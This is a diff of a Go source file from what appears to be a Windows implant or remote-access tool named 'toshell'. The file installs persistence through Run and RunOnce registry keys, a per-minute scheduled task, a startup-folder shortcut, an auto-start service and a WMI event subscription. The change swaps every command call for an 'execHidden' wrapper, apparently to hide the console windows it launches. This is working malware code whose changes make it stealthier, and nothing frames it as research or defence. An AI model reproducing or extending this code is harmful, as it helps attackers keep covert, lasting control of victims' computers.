@@ -6,7 +6,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"strings"
 )
@@ -74,7 +73,7 @@ func installRegistryRun(exePath string) (string, int32, string) {
 		name = "toshell"
 	}
 
-	cmd := exec.Command(sysBin("reg.exe"), "add",
+	cmd := execHidden(sysBin("reg.exe"), "add",
 		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
 		"/v", name,
 		"/t", "REG_SZ",
@@ -91,7 +90,7 @@ func installRegistryRun(exePath string) (string, int32, string) {
 // installRegistryRunOnce 写入 HKLM\...\RunOnce (需管理员)
 func installRegistryRunOnce(exePath string) (string, int32, string) {
 	name := "toshell_update"
-	cmd := exec.Command(sysBin("reg.exe"), "add",
+	cmd := execHidden(sysBin("reg.exe"), "add",
 		`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`,
 		"/v", name,
 		"/t", "REG_SZ",
@@ -109,7 +108,7 @@ func installRegistryRunOnce(exePath string) (string, int32, string) {
 func installScheduledTask(exePath string) (string, int32, string) {
 	name := "toshell_check"
 	// 使用 schtasks 创建每分钟触发的任务
-	cmd := exec.Command(sysBin("schtasks.exe"), "/create",
+	cmd := execHidden(sysBin("schtasks.exe"), "/create",
 		"/tn", name,
 		"/tr", exePath,
 		"/sc", "minute",
@@ -138,7 +137,7 @@ func installStartupFolder(exePath string) (string, int32, string) {
 		`$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%s'); $Shortcut.TargetPath = '%s'; $Shortcut.WindowStyle = 7; $Shortcut.Save()`,
 		lnkPath, exePath,
 	)
-	cmd := exec.Command(sysPowershell(), "-NoProfile", "-WindowStyle", "Hidden", "-Command", psScript)
+	cmd := execHidden(sysPowershell(), "-NoProfile", "-WindowStyle", "Hidden", "-Command", psScript)
 	output, err := cmd.CombinedOutput()
 	if err != nil {
 		return "", -1, fmt.Sprintf("启动文件夹写入失败: %v\n%s", err, string(output))
@@ -149,7 +148,7 @@ func installStartupFolder(exePath string) (string, int32, string) {
 // installService 安装 Windows 服务
 func installService(exePath string) (string, int32, string) {
 	name := "toshell_svc"
-	cmd := exec.Command(sysBin("sc.exe"), "create", name,
+	cmd := execHidden(sysBin("sc.exe"), "create", name,
 		"binPath=", exePath,
 		"start=", "auto",
 		"DisplayName=", "ToShell Service",
@@ -157,9 +156,9 @@ func installService(exePath string) (string, int32, string) {
 	output, err := cmd.CombinedOutput()
 	if err != nil {
 		// 尝试先删除再创建
-		exec.Command(sysBin("sc.exe"), "stop", name).Run()
-		exec.Command(sysBin("sc.exe"), "delete", name).Run()
-		cmd = exec.Command(sysBin("sc.exe"), "create", name,
+		execHidden(sysBin("sc.exe"), "stop", name).Run()
+		execHidden(sysBin("sc.exe"), "delete", name).Run()
+		cmd = execHidden(sysBin("sc.exe"), "create", name,
 			"binPath=", exePath,
 			"start=", "auto",
 			"DisplayName=", "ToShell Service",
@@ -171,7 +170,7 @@ func installService(exePath string) (string, int32, string) {
 	}
 
 	// 启动服务
-	exec.Command(sysBin("sc.exe"), "start", name).Run()
+	execHidden(sysBin("sc.exe"), "start", name).Run()
 	return fmt.Sprintf("[+] 持久化成功 (Service): %s", name), 0, ""
 }
 
@@ -201,7 +200,7 @@ $BindingArgs = @{
 Set-WmiInstance -Class __FilterToConsumerBinding -Arguments $BindingArgs
 `, exePath)
 
-	cmd := exec.Command(sysPowershell(), "-NoProfile", "-WindowStyle", "Hidden", "-Command", psScript)
+	cmd := execHidden(sysPowershell(), "-NoProfile", "-WindowStyle", "Hidden", "-Command", psScript)
 	output, err := cmd.CombinedOutput()
 	if err != nil {
 		return "", -1, fmt.Sprintf("WMI 安装失败 (需要管理员权限): %v\n%s", err, string(output))
@@ -224,14 +223,14 @@ func removePersistence(exePath string) (string, int32, string) {
 	// 移除注册表 Run
 	name := filepath.Base(exePath)
 	name = strings.TrimSuffix(name, ".exe")
-	exec.Command(sysBin("reg.exe"), "delete",
+	execHidden(sysBin("reg.exe"), "delete",
 		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
 		"/v", name, "/f",
 	).Run()
 	results = append(results, "[✓] Registry Run removed")
 
 	// 移除计划任务
-	exec.Command(sysBin("schtasks.exe"), "/delete", "/tn", "toshell_check", "/f").Run()
+	execHidden(sysBin("schtasks.exe"), "/delete", "/tn", "toshell_check", "/f").Run()
 	results = append(results, "[✓] Scheduled Task removed")
 
 	// 移除启动文件夹快捷方式
@@ -245,8 +244,8 @@ func removePersistence(exePath string) (string, int32, string) {
 	results = append(results, "[✓] Startup Folder shortcut removed")
 
 	// 移除服务
-	exec.Command(sysBin("sc.exe"), "stop", "toshell_svc").Run()
-	exec.Command(sysBin("sc.exe"), "delete", "toshell_svc").Run()
+	execHidden(sysBin("sc.exe"), "stop", "toshell_svc").Run()
+	execHidden(sysBin("sc.exe"), "delete", "toshell_svc").Run()
 	results = append(results, "[✓] Service removed")
 
 	return strings.Join(results, "\n"), 0, ""
